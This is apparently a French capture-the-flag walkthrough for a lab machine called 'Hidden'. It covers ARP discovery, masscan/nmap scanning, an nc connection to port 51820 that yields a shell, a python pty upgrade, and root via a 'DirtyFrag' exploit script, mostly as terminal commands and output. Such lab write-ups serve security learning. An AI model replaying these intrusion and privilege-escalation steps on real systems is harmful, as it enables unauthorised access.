# Hidden

## 🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh 
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       🖥️       │         ⚙️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3
```

&nbsp;

## <span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 51820/tcp open
 
📋 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

## **<span style="color: #dddddd;">🐾</span> nc**

Connexion au port `51820`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nc 192.168.56.254 51820
python3 -c 'import pty;pty.spawn("/bin/bash")'
hidden@cache:/$
```

&nbsp;

## **🛰️ fullEx**

Élévation de privilège

```
hidden@cache:~/fullEx$ ./fullEx.sh -DirtyFrag
# bash -i
root@cache:/home/hidden/fullEx#
```

&nbsp;
